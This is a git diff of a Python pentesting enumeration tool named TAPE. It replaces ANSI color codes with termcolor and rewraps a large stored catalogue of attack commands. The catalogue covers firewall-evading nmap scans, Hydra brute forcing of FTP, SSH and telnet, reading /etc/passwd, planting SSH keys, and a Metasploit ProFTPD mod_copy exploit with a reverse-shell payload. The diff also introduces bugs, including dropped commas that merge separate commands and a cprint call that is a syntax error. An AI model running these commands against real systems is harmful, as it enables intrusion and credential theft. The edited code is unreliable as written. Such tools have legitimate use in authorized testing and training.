@@ -16,25 +16,11 @@ import argparse
 import subprocess
 from collections import defaultdict
 from datetime import datetime
+from termcolor import cprint, colored
 
 # -----------------------------
 # Configurations and Variables
 # -----------------------------
-
-# Colors for output
-RED = '\033[0;31m'
-GREEN = '\033[0;32m'
-YELLOW = '\033[1;33m'
-BLUE = '\033[0;34m'
-MAGENTA = '\033[0;35m'
-CYAN = '\033[0;36m'
-BRIGHT_YELLOW = '\033[1;33m'
-NC = '\033[0m'  # No Color
-
-# Additional Colors for Protocol, Actions, and Subactions
-PROTOCOL_COLOR = '\033[1;31m'  # Bright Red
-ACTION_COLOR = '\033[1;34m'    # Bright Blue
-SUBACTION_COLOR = ACTION_COLOR  # Same color for action and subaction
 
 # Directories
 RECON_DIR = "recon"
@@ -96,31 +82,29 @@ SERVICES = {
 # -----------------------------
 
 def update_script():
-    """Updates the script by downloading the latest version from GitHub."""
-    print(f"{BLUE}[+] Checking for updates...{NC}")
+    cprint("[+] Checking for updates...", "blue")
     github_url = "https://raw.githubusercontent.com/ChronosPK/TAPE/main/tape.py"
     try:
         response = requests.get(github_url, timeout=10)
         if response.status_code == 200:
             script_path = os.path.realpath(__file__)
             backup_path = script_path + ".bak"
-            # Backup current script
             shutil.copy2(script_path, backup_path)
-            # Write new script
             with open(script_path, 'w', encoding='utf-8') as script_file:
                 script_file.write(response.text)
-            print(f"{GREEN}[+] TAPE has been updated to the latest version.{NC}")
-            print(f"{YELLOW}[i] A backup of the previous version is saved as {backup_path}.{NC}")
+            cprint("[+] TAPE has been updated to the latest version.", "green")
+            cprint(f"[i] A backup is saved as {backup_path}.", "yellow")
         else:
-            print(f"{RED}[!] Failed to download the latest version. HTTP Status Code: {response.status_code}{NC}")
+            cprint(f"[!] Failed to download the latest version. HTTP Status Code: {response.status_code}", "red")
     except Exception as e:
-        print(f"{RED}[!] An error occurred while updating: {e}{NC}")
+        cprint(f"[!] An error occurred: {e}", "red")
 
-# Argument Parser
 parser = argparse.ArgumentParser(
     description="TAPE - Tmux Automated Pentesting Enumeration",
     formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=35)
 )
+
+parser.add_argument('-e', '--env', help='Create the environment with appropriate files and directories')
 parser.add_argument('-n', '--net', help='Set target network (e.g., 192.168.1.0/24)')
 parser.add_argument('-i', '--ip', help='Set target IP address')
 parser.add_argument('-d', '--domain', metavar='DOMAIN', help='Set target domain')
@@ -156,7 +140,9 @@ def format_command(command, variables):
     return command
 
 def list_commands(commands, variables, service=None):
-    services_to_list = [service.upper()] if service else sorted(commands.keys(), key=lambda x: SERVICES.get(x, {}).get('ports', [0])[0])
+    services_to_list = [service.upper()] if service else sorted(
+        commands.keys(), key=lambda x: SERVICES.get(x, {}).get('ports', [0])[0]
+    )
     for protocol in services_to_list:
         if protocol not in commands:
             continue
@@ -165,16 +151,16 @@ def list_commands(commands, variables, service=None):
         transport = SERVICES.get(protocol, {}).get('transport', 'N/A')
         for action in actions:
             for subaction in actions[action]:
-                action_subaction_title = f"{PROTOCOL_COLOR}{protocol} - {ports}/{transport} - {ACTION_COLOR}{action} - {SUBACTION_COLOR}{subaction}{NC}"
-                print(action_subaction_title)
+                action_subaction_title = f"{protocol} - {ports}/{transport} - {action} - {subaction}"
+                cprint(action_subaction_title, "cyan")
                 for cmd_group in actions[action][subaction]:
                     description = cmd_group.get('description', None)
                     cmds = cmd_group.get('commands', [])
                     if description:
-                        print(f"{YELLOW}# {description}{NC}")
+                        cprint(f"# {description}", "yellow")
                     for cmd in cmds:
                         cmd_display = format_command(cmd, variables)
-                        print(cmd_display)
+                        cprint(cmd_display, "green")
                     print()
 
 
@@ -191,19 +177,23 @@ def main():
         'USER': 'USER',
         'PASS': 'PASS',
     }
+    if args.env:
+        create_directories_and_files()
+        cprint("[+] Directories and files have been created.", "green")
+        sys.exit(0)
 
     # If both IP and domain are provided
     if args.ip and args.domain:
         resolved_ip = resolve_domain(args.domain)
         if resolved_ip:
             if resolved_ip != args.ip:
-                print(f"{RED}[!] Error: Domain {args.domain} does not resolve to IP {args.ip}.{NC}")
+                cprint(f"[!] Error: Domain {args.domain} does not resolve to IP {args.ip}.", "red")
                 sys.exit(1)
             else:
                 variables['IP'] = args.ip
                 variables['DOMAIN'] = args.domain
         else:
-            print(f"{RED}[!] Error: Unable to resolve domain {args.domain}.{NC}")
+            cprint(f"[!] Error: Unable to resolve domain {args.domain}.", "red")
             sys.exit(1)
     elif args.domain:
         # Only domain is provided
@@ -212,7 +202,7 @@ def main():
             variables['IP'] = resolved_ip
             variables['DOMAIN'] = args.domain
         else:
-            print(f"{RED}[!] Error: Unable to resolve domain {args.domain}.{NC}")
+            cprint(f"[!] Error: Unable to resolve domain {args.domain}.", "red")
             sys.exit(1)
     elif args.ip:
         # Only IP is provided
@@ -230,49 +220,46 @@ def main():
     # Prioritize domain over IP in URL
     variables['URL'] = f"http://{variables['DOMAIN'] if variables['DOMAIN'] != 'DOMAIN' else variables['IP']}"
 
-    # Create directories and files with proper permissions
-    create_directories_and_files()
-
     # Create commands for recon and for each service
     COMMANDS['RECON']['Network'][''] = [
         {
             'description': "netdiscover",
             'commands': [
-                "sudo netdiscover -i eth0 -r NET"
+                r"""sudo netdiscover -i eth0 -r NET"""
             ]
         },
         {
             'description': "nmap",
             'commands': [
-                "nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init",
-                """cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
-                "sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"
+                r"""nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init""",
+                r"""cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
+                r"""sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"""
             ]
         },
         {
             'description': "fping + nmap",
             'commands': [
-                "fping -a -g NET 2>/dev/null > recon/hosts",
-                "nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"
+                r"""fping -a -g NET 2>/dev/null > recon/hosts""",
+                r"""nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"""
             ]
         },
         {
             'description': "masscan",
             'commands': [
-                "masscan NET –echo > recon/masscan.conf"
+                r"""masscan NET –echo > recon/masscan.conf"""
             ]
         },
         {
             'description': "UDP with nmap",
             'commands': [
-                "nmap -sU -sV --version-intensity 0 -F -n NET -oN recon/nmap.udp-net",
-                "udp-proto-scanner.pl NET"
+                r"""nmap -sU -sV --version-intensity 0 -F -n NET -oN recon/nmap.udp-net""",
+                r"udp-proto-scanner.pl NET"
             ]
         },
         {
             'description': "No man's land",
             'commands': [
-                "for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep 'bytes from' | awk '{print $4}' | cut -d ':' -f 1 &) ;done"
+                r"""for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep 'bytes from' | awk '{print $4}' | cut -d ':' -f 1 &) ;done"""
             ]
         }
     ]
@@ -282,33 +269,33 @@ def main():
         {
             "description": "Extract ports and run all-TCP scan",
             "commands": [
-                "nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init",
-                """cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
-                "sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"
+                r"""nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init""",
+                r"""cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\\n' ',' | sed 's/,$//g' > recon/ports""",
+                r"""sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"""
             ]
         },
         {
             "description": "Perform OS detection with Nmap",
             "commands": [
-                "sudo nmap -O -Pn -p- -T4 --max-retries 4 -v IP -oN recon/nmap.os"
+                r"""sudo nmap -O -Pn -p- -T4 --max-retries 4 -v IP -oN recon/nmap.os"""
             ]
         },
         {
             "description": "Vulnerability scan with Nmap",
             "commands": [
-                "nmap --script vulners -Pn -sC -sV -v -A -T4 -p- --max-retries 5 --open IP -oN recon/nmap.vuln"
+                r"""nmap --script vulners -Pn -sC -sV -v -A -T4 -p- --max-retries 5 --open IP -oN recon/nmap.vuln"""
             ]
         },
         {
             "description": "Run UDP scan with Nmap",
             "commands": [
-                "nmap -sU -sV -sC -n -F -T4 IP -oN recon/nmap.udp"
+                r"""nmap -sU -sV -sC -n -F -T4 IP -oN recon/nmap.udp"""
             ]
         },
         {
             'description': "Firewall evasion",
             'commands': [
-                'sudo nmap -v -Pn -sS -sV -T4 --max-retries 3 --min-rate 450 --max-rtt-timeout 500ms --min-rtt-timeout 50ms -p- -f --source-port 53 --spoof-mac aa:bb:cc:dd:ee:ff IP'
+                r"""sudo nmap -v -Pn -sS -sV -T4 --max-retries 3 --min-rate 450 --max-rtt-timeout 500ms --min-rtt-timeout 50ms -p- -f --source-port 53 --spoof-mac aa:bb:cc:dd:ee:ff IP"""
         ]
         }
     ]
@@ -316,7 +303,7 @@ def main():
         {
             "description": "Fast rustscan analysis",
             "commands": [
-                "rustscan -a IP --ulimit 5000 -- -sC -sV -v -oN recon/rustscan.init"
+                r"""rustscan -a IP --ulimit 5000 -- -sC -sV -v -oN recon/rustscan.init"""
             ]
         },
     ]
@@ -324,7 +311,7 @@ def main():
         {
             "description": "Enumeration with autorecon",
             "commands": [
-                "autorecon -v --heartbeat 10 IP"
+                r"""autorecon -v --heartbeat 10 IP"""
             ]
         },
     ]
@@ -332,7 +319,7 @@ def main():
         {
             "description": "Recon with legion - GUI application",
             "commands": [
-                "sudo legion"
+                r"""sudo legion"""
             ]
         },
     ]
@@ -340,7 +327,7 @@ def main():
         {
             "description": "Recon with zenmap - GUI application",
             "commands": [
-                "zenmap"
+                r"""zenmap"""
             ]
         },
     ]
@@ -348,7 +335,7 @@ def main():
         {
             "description": "Utilizing /dev/tcp/ip/port to test connection",
             "commands": [
-                "for port in {1..65535}; do echo 2>/dev/null > /dev/tcp/IP/$port && echo -e \"$port open\\n\"; done"
+                r"""for port in {1..65535}; do echo 2>/dev/null > /dev/tcp/IP/$port && echo -e "$port open\n"; done"""
             ]
         },
     ]
@@ -358,13 +345,13 @@ def main():
         {
             'description': "Check for anonymous FTP login with Nmap",
             'commands': [
-                'nmap -p PORT --script ftp-anon IP -oN recon/ftp_anonymous.txt'
+                r"""nmap -p PORT --script ftp-anon IP -oN recon/ftp_anonymous.txt"""
             ]
         },
         {
             'description': "Check for anonymous FTP login with FTP client",
             'commands': [
-                'ftp -nv IP PORT'
+                r"""ftp -nv IP PORT"""
             ]
         }
     ]
@@ -372,13 +359,13 @@ def main():
         {
             'description': "FTP Banner Grabbing with Nmap",
             'commands': [
-                'nmap -sV -p PORT IP -oN recon/ftp_banner.txt'
+                r"""nmap -sV -p PORT IP -oN recon/ftp_banner.txt"""
             ]
         },
         {
             'description': "FTP Banner Grabbing with Netcat",
             'commands': [
-                'nc -nv IP PORT'
+                r"""nc -nv IP PORT"""
             ]
         }
     ]
@@ -386,13 +373,13 @@ def main():
         {
             'description': "FTP Brute Force with Hydra",
             'commands': [
-                'hydra -L users.txt -P passwords.txt ftp://IP -s PORT'
+                r"""hydra -L users.txt -P passwords.txt ftp://IP -s PORT"""
             ]
         },
         {
             'description': "FTP User Enumeration with ftp-user-enum",
             'commands': [
-                'ftp-user-enum.pl -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t IP'
+                r"""ftp-user-enum.pl -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t IP"""
             ]
         }
     ]
@@ -400,31 +387,31 @@ def main():
         {
             'description': "List files and directories",
             'commands': [
-                'ls -lsa'
+                r"""ls -lsa"""
             ]
         },
         {
             'description': "Download a specific file",
             'commands': [
-                'get FILENAME'
+                r"""get FILENAME"""
             ]
         },
         {
             'description': "Download all files",
             'commands': [
-                'prompt; mget *'
+                r"""prompt; mget *"""
             ]
         },
         {
             'description': "Recursive download using wget",
             'commands': [
-                'wget -r ftp://USER:PASS@IP/'
+                r"""wget -r ftp://USER:PASS@IP/"""
             ]
         },
         {
             'description': "Enter passive FTP session",
             'commands': [
-                'quote PASV'
+                r"""quote PASV"""
             ]
         }
     ]
@@ -432,13 +419,13 @@ def main():
         {
             'description': "Upload binary files",
             'commands': [
-                'binary; put BINARY_FILE'
+                r"""binary; put BINARY_FILE"""
             ]
         },
         {
             'description': "Upload ASCII files",
             'commands': [
-                'ascii; put ASCII_FILE'
+                r"""ascii; put ASCII_FILE"""
             ]
         }
     ]
@@ -446,14 +433,14 @@ def main():
         {
             'description': "Mount FTP folder using curlftpfs",
             'commands': [
-                'mkdir /mnt/ftp',
-                'curlftpfs IP /mnt/ftp/ -o user=USER:PASS'
+                r"""mkdir /mnt/ftp""",
+                r"""curlftpfs IP /mnt/ftp/ -o user=USER:PASS"""
             ]
         },
         {
             'description': "Unmount FTP folder",
             'commands': [
-                'fusermount -u /mnt/ftp'
+                r"""fusermount -u /mnt/ftp"""
             ]
         }
     ]
@@ -461,21 +448,21 @@ def main():
         {
             'description': "Exploit manually",
             'commands': [
-                'nc -v IP 21',
-                'site cpfr LOCAL_FILE',
-                'site cpto FTP_DIRECTORY'
+                r"""nc -v IP 21""",
+                r"""site cpfr LOCAL_FILE""",
+                r"""site cpto FTP_DIRECTORY"""
             ]
         },
         {
             'description': "Exploit with metasploit",
             'commands': [
-                'sudo msfdb start',
-                'msfconsole -q ',
-                'use /exploit/unix/ftp/proftpd_modcopy_exec',
-                'set Rhosts IP',
-                'set lhost tun0',
-                'set sitepath /var/www/something',
-                'set payload cmd/unix/reverse_python'
+                r"""sudo msfdb start""",
+                r"""msfconsole -q """,
+                r"""use /exploit/unix/ftp/proftpd_modcopy_exec""",
+                r"""set Rhosts IP""",
+                r"""set lhost tun0""",
+                r"""set sitepath /var/www/something""",
+                r"""set payload cmd/unix/reverse_python"""
             ]
         }
     ]
@@ -485,13 +472,13 @@ def main():
         {
             'description': "SSH Banner Grabbing with Nmap",
             'commands': [
-                'nmap -p22 IP -sV'
+                r"""nmap -p22 IP -sV"""
             ]
         },
         {
             'description': "SSH Keyscan",
             'commands': [
-                'ssh-keyscan -t rsa IP -p 22'
+                r"""ssh-keyscan -t rsa IP -p 22"""
             ]
         }
     ]
@@ -499,7 +486,7 @@ def main():
         {
             'description': "List supported algorithms",
             'commands': [
-                'nmap -p22 IP --script ssh2-enum-algos -oN recon/ssh-alg'
+                r"""nmap -p22 IP --script ssh2-enum-algos -oN recon/ssh-alg"""
             ]
         }
     ]
@@ -507,7 +494,7 @@ def main():
         {
             'description': "Brute force SSH with Hydra",
             'commands': [
-                'hydra -l USER -P notes/passwords.txt ssh://IP -s 22'
+                r"""hydra -l USER -P notes/passwords.txt ssh://IP -s 22"""
             ]
         }
     ]
@@ -515,7 +502,7 @@ def main():
         {
             'description': "Execute a command right after login",
             'commands': [
-                'ssh -v USER@IP id;cat /etc/passwd'
+                r"""ssh -v USER@IP id;cat /etc/passwd"""
             ]
         }
     ]
@@ -523,15 +510,15 @@ def main():
         {
             'description': "Simple login",
             'commands': [
-                'chmod 600 id_rsa',
-                'ssh -i id_rsa USER@IP'
+                r"""chmod 600 id_rsa""",
+                r"""ssh -i id_rsa USER@IP"""
             ]
         },
         {
             'description': "Passphrase protected",
             'commands': [
-                'ssh2john id_rsa > notes/hashes-ssh.txt',
-                'john notes/hashes-ssh.txt --wordlist=/usr/share/wordlists/rockyou.txt'
+                r"""ssh2john id_rsa > notes/hashes-ssh.txt"""
+                r"""john notes/hashes-ssh.txt --wordlist=/usr/share/wordlists/rockyou.txt"""
             ]
         }
     ]
@@ -539,20 +526,20 @@ def main():
         {
             'description': "Local Tunnel",
             'commands': [
-                'ssh -L local_ip:local_port:destination_ip:destination_port user@IP'
+                r"""ssh -L local_ip:local_port:destination_ip:destination_port user@IP"""
             ]
         },
         {
             'description': "Remote Tunnel",
             'commands': [
-                'ssh -R remote_ip:remote_port:destination_ip:destination_port user@IP'
+                r"""ssh -R remote_ip:remote_port:destination_ip:destination_port user@IP"""
             ]
         },
         {
             'description': "Additional arguments",
             'commands': [
-                '-N don\'t execute commands',
-                '-f run in background'
+                r"""-N don't execute commands"""
+                r"""-f run in background"""
             ]
         }
     ]
@@ -560,8 +547,8 @@ def main():
         {
             'description': "Generate SSH keys",
             'commands': [
-                'ssh-keygen',
-                'scp ~/.ssh/id_rsa.pub USER@IP:/home/USER/.ssh/authorized_keys'
+                r"""ssh-keygen"""
+                r"""scp ~/.ssh/id_rsa.pub USER@IP:/home/USER/.ssh/authorized_keys"""
             ]
         }
     ]
@@ -569,14 +556,14 @@ def main():
         {
             'description': "Check config file",
             'commands': [
-                'sudo nano /etc/knockd.conf',
-                'sudo vim /etc/default/knockd'
+                r"""sudo nano /etc/knockd.conf"""
+                r"""sudo vim /etc/default/knockd"""
             ]
         },
         {
             'description': "Knock on the found ports to open SSH",
             'commands': [
-                'knock -v IP port1 port2 port3'
+                r"""knock -v IP port1 port2 port3"""
             ]
         }
     ]
@@ -586,7 +573,7 @@ def main():
         {
             'description': "",
             'commands': [
-                'nmap -n -sV -Pn --script "*telnet* and safe" -p PORT IP -oN recon/nmap.telnet'
+                r"""nmap -n -sV -Pn --script "*telnet* and safe" -p PORT IP -oN recon/nmap.telnet"""
             ]
         }
     ]
@@ -594,7 +581,7 @@ def main():
         {
             'description': "",
             'commands': [
-                'hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt IP telnet'
+                r"""hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt IP telnet"""
             ]
         }
     ]
@@ -604,16 +591,16 @@ def main():
         {
             'description': "Check for valid users with VRFY",
             'commands': [
-                'nc IP 25',
-                'VRFY root',
-                'VRFY user'
+                r"""nc IP 25""",
+                r"""VRFY root""",
+                r"""VRFY user"""
             ]
         },
         {
             'description': "Possible responses",
             'commands': [
-                '252 2.0.0 root',
-                '550 5.1.1 user: ... User unknown in local recipient table'
+                r"""252 2.0.0 root"""
+                r"""550 5.1.1 user: ... User unknown in local recipient table"""
             ]
         }
     ]
@@ -621,19 +608,19 @@ def main():
         {
             'description': "With smtp-user-enum",
             'commands': [
-                'smtp-user-enum -M VRFY -U users.txt -t IP'
+                r"""smtp-user-enum -M VRFY -U users.txt -t IP"""
             ]
         },
         {
             'description': "With nmap",
             'commands': [
-                'nmap --script smtp-enum-users IP -oN recon/nmap.smtp-users'
+                r"""nmap --script smtp-enum-users IP -oN recon/nmap.smtp-users"""
             ]
         },
         {
             'description': "With metasploit",
             'commands': [
-                'msfconsole -q -e "use auxiliary/scanner/smtp/smtp_enum"'
+                r"""msfconsole -q -e "use auxiliary/scanner/smtp/smtp_enum" """
             ]
         }
     ]
@@ -641,7 +628,7 @@ def main():
         {
             'description': "Use nmap to find allowed commands",
             'commands': [
-                'nmap -p PORT --script smtp-commands IP -oN recon/nmap.smtp-comm'
+                r"""nmap -p PORT --script smtp-commands IP -oN recon/nmap.smtp-comm"""
             ]
         }
     ]
@@ -649,16 +636,16 @@ def main():
         {
             'description': "Use nmap",
             'commands': [
-                'nmap -sS -v --script=*-ntlm-info --script-timeout=60s DOMAIN -oN recon/nmap.smtp-ntlm'
+                r"""nmap -sS -v --script=*-ntlm-info --script-timeout=60s DOMAIN -oN recon/nmap.smtp-ntlm"""
             ]
         },
         {
             'description': "Check for NTLM challenge response for information disclosure",
             'commands': [
-                'telnet DOMAIN PORT',
-                'HELO ',
-                'NTLM AUTH',
-                'TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA='
+                r"""telnet DOMAIN PORT""",
+                r"""HELO""",
+                r"""NTLM AUTH""",
+                r"""TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="""
             ]
         }
     ]
@@ -666,7 +653,7 @@ def main():
         {
             'description': "Enumerate with dig",
             'commands': [
-                'dig +short mx DOMAIN'
+                r"""dig +short mx DOMAIN"""
             ]
         }
     ]
@@ -674,8 +661,8 @@ def main():
         {
             'description': "Things to try while on the server",
             'commands': [
-                '- look for info about the network topology',
-                '- view headers for relevant information'
+                r"""- look for info about the network topology""",
+                r"""- view headers for relevant information"""
             ]
         }
     ]
@@ -685,8 +672,8 @@ def main():
         {
             'description': "Enumeration",
             'commands': [
-                'whois -h IP -p PORT "DOMAIN"',
-                'echo "DOMAIN" | nc -vn IP PORT'
+                r"""whois -h IP -p PORT "DOMAIN" """,
+                r"""echo "DOMAIN" | nc -vn IP PORT """
             ]
         }
     ]
@@ -904,23 +891,25 @@ def main():
         sys.exit(0)
 
     if not is_root():
-        print(f"{RED}[!] Please run as root.{NC}")
+        cprint(f"[!] Please run as root.", "red")
         sys.exit(1)
 
     # Proceed with execution
     # Check if recon has been done
     recon_done = os.path.exists('recon/nmap.init')
     if recon_done and not args.force_recon:
-        print(f"{GREEN}[*] Reconnaissance scans already completed.")
-        print(f"{YELLOW}[*] Use --force-recon to run reconnaissance scans again.{NC}")
+        cprint(f"[*] Reconnaissance scans already completed.", "green")
+        cprint(f"[*] Use --force-recon to run reconnaissance scans again.", "yellow")
     else:
-        print(f"{GREEN}[*] Running reconnaissance scans...{NC}")
+        cprint(f"[*] Running reconnaissance scans...", "green")
         variables['PORT'] = ''
         # Execute the first RECON command group
         recon_commands = COMMANDS['RECON']['Single Host']['nmap'][0]['commands']
         desc = COMMANDS['RECON']['Single Host']['nmap'][0]['description']
         if not args.quiet:
-            print(f"{PROTOCOL_COLOR}RECON{NC} - {ACTION_COLOR}{desc}{NC}")
+            cprint("RECON", end="", "red")
+            cprint(" - ")
+            cprint(desc, "cyan")
         for cmd in recon_commands:
             cmd_exec = format_command(cmd, variables)
             if not args.quiet:
